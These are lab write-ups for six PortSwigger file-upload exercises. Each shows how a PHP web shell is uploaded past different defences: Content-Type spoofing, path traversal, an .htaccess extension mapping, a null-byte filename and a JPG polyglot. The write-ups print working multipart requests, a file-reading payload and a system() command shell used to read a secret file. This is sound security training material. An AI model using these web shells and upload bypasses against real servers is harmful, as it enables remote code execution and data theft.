01 Remote code execution via web shell upload
=============================================

This lab contains a vulnerable image upload function. It doesn't perform any
validation on the files users upload before storing them on the server's
filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the
contents of the file /home/carlos/secret. Submit this secret using the button
provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

References:

-   https://portswigger.net/web-security/file-upload

![img](media/66e1900dcf6ff9c702c492bf57995856.png)

There is a function to upload a logo, it is possible to upload a PHP file to
show the content of the file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/avatar HTTP/2
...
-----------------------------372082654728426116931381616293
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------372082654728426116931381616293
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/6d91263b2e709e815318f56d45869092.png)

Now you can read the value of the file ("G5Bm58gT0NzAmOPLxpe0vR82y4CNT6WY")
accessing /avatars/test.php:

![img](media/f545849fd898ab15e8b939020e851ec5.png)

02 Web shell upload via Content-Type restriction bypass
=======================================================

This lab contains a vulnerable image upload function. It attempts to prevent
users from uploading unexpected file types, but relies on checking
user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the
contents of the file /home/carlos/secret. Submit this secret using the button
provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

References:

-   https://portswigger.net/web-security/file-upload

![img](media/5ac843034cdaf3c7b39eb10c613cb134.png)

If we try the same payload as the previous lab there is an error:

![img](media/3868a50330d66377940f7ac68b10b480.png)

Changing the Content-Type it is possible to upload the PHP file:

![img](media/2bc1c05c8867bfccd31aea3aedfd4b96.png)

And read the secret ("wDHZLacPXl2c4B4MZl2j7T3MluCqDzjR"):

![img](media/f2d549ec48bfbb407502cb22c6794d9f.png)

03 Web shell upload via path traversal
======================================

This lab contains a vulnerable image upload function. The server is configured
to prevent execution of user-supplied files, but this restriction can be
bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the
contents of the file /home/carlos/secret. Submit this secret using the button
provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

References:

-   https://portswigger.net/web-security/file-upload

![img](media/0f9859433bd1e19181427915072342b6.png)

It is possible to upload a PHP file:

![img](media/4150105830fde6a44672f2fc3adefe5c.png)

But it does not execute:

![img](media/7748c7d65c4272c97efc645f27cdb4dc.png)

To execute the PHP file we will upload it in a different directory using path
traversal. We need to encode the payload or it will not work
(filename="%2e%2e%2fb.php"):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/avatar HTTP/2
...
-----------------------------40637643122628174081089911774
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fb.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------40637643122628174081089911774
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/1cc5fae594b79b29a740f65068d43778.png)

The files is uploaded to the folder “/files” and not “/files/avatars”:

![img](media/25f07aaa418cdd48038c58781768c792.png)

04 Web shell upload via extension blacklist bypass
==================================================

This lab contains a vulnerable image upload function. Certain file extensions
are blacklisted, but this defense can be bypassed due to a fundamental flaw in
the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the
contents of the file /home/carlos/secret. Submit this secret using the button
provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

Hint: You need to upload two different files to solve this lab.

References:

-   https://portswigger.net/web-security/file-upload

New .htaccess file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .l33t
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/4e4db020a2bbb15b34107d9a1ed27f39.png)

![img](media/b8b84db19531e4350d7e71864cbb39ec.png)

Upload Phpinfo file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename="test.l33t"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/56288a30fa58734aa0a684ab71c0c5c8.png)

![img](media/661a3c52f188eefc45e1047832e35b8f.png)

Upload cmdshell:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename="cmd.l33t"
Content-Type: application/octet-stream

<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=whoami
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/e95f563e41d02814c5cd9c3c08a0e134.png)

![img](media/0f6993a825afdf6f2b7a4ac82e8a375c.png)

Read the file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=cat%20/home/carlos/secret
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq

![img](media/911a8429912ff25d799acea579b11d8a.png)

05 Web shell upload via obfuscated file extension
=================================================

This lab contains a vulnerable image upload function. Certain file extensions
are blacklisted, but this defense can be bypassed using a classic obfuscation
technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the
contents of the file /home/carlos/secret. Submit this secret using the button
provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

References:

-   https://portswigger.net/web-security/file-upload

![img](media/c8518fc20d96a0d16820690ee8e3a2cf.png)

It is not possible to upload PHP files:

![img](media/4ec9817202e5ffeea50407761cfbcb99.png)

I tried to upload the file with the names:

-   “test.php.jpg” but it is interepreted as an image.

-   “test.php.” but it is not accepted

-   “test%2Ephp” but it is not accepted

The payload “test.php%00.jpg” uploads a file “test.php”:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/avatar HTTP/2
...
-----------------------------384622689610978532422380962615
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------384622689610978532422380962615
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/fc5c46a2eb329ab4002d80e41fe86f2f.png)

The file test.php has been created:

![img](media/7b9eb74b409ad063908d7cfc34533c0e.png)

06 Remote code execution via polyglot web shell upload
======================================================

This lab contains a vulnerable image upload function. Although it checks the
contents of the file to verify that it is a genuine image, it is still possible
to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the
contents of the file /home/carlos/secret. Submit this secret using the button
provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

References:

-   https://portswigger.net/web-security/file-upload

![img](media/05e566850825a1a8b31a49ed7a1218c7.png)

I uploaded a real JPG file and deleted as many bytes as possible. This is the
least you can send so the server still finds it is a JPG image:

![img](media/4708b799988a9b3315d28de4a58585ca.png)

So we can change everything to update a PHP file like this:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/avatar HTTP/2
...
-----------------------------223006367629168816071656253944
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<--JPG MAGIC NUMBER-->

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------223006367629168816071656253944
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/4c988d4c593165389a590a416225fc3a.png)

And then access /files/avatars/test.php to read the content of the file:

![img](media/91790157828e585033f0707b14a29174.png)
